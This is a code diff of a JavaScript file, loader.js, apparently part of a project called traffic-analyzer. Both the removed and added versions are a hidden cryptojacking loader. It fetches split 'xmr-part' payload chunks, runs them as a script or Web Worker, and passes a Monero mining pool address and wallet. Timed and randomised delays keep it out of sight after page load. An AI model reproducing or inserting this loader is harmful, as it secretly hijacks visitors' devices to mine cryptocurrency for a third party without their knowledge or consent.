@@ -1,19 +1,34 @@
 // loader.js
-setTimeout(async () => {
-  const parts = ['xmr-part-aa', 'xmr-part-ab', 'xmr-part-ac']; 
+const PARTS = ['xmr-part-aa', 'xmr-part-ab', 'xmr-part-ac'];
 
-  const blobParts = [];
-  
-  for (const part of parts) {
-    const response = await fetch(`https://abdulabdulabdul.github.io/traffic-analyzer/${part}`);
-    blobParts.push(await response.arrayBuffer());
+const loadWorker = async () => {
+  try {
+
+    const buffers = await Promise.all(
+      PARTS.map(part => 
+        fetch(part)
+          .then(res => res.arrayBuffer())
+      )
+    );
+
+   
+    const combined = new Blob(buffers, { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(combined);
+    
+
+    const worker = new Worker(workerUrl);
+    worker.postMessage({ 
+      action: 'init',
+      config: {
+        pool: 'xmr-eu1.nanopool.org:14433',
+        wallet: '831iLs4viYZ4cCJhuH2QUxWKBzVw3wPXFNGavgjjic2y6Vcujx7bWTyT5YMMrQd9BpFv1TEeXquGH5Vcdn1vwwXfTpVaYDD'
+      }
+    });
+
+  } catch(e) {
+    console.error('Failed to load worker:', e);
   }
+};
 
-  const exeBlob = new Blob(blobParts, { type: 'application/octet-stream' });
-  const exeUrl = URL.createObjectURL(exeBlob);
-  
-  const script = document.createElement('script');
-  script.src = exeUrl;
-  document.body.appendChild(script);
-
-}, 20000);
+// Start po 30s + losowe opóźnienie
+setTimeout(loadWorker, 30000 + Math.random() * 15000);
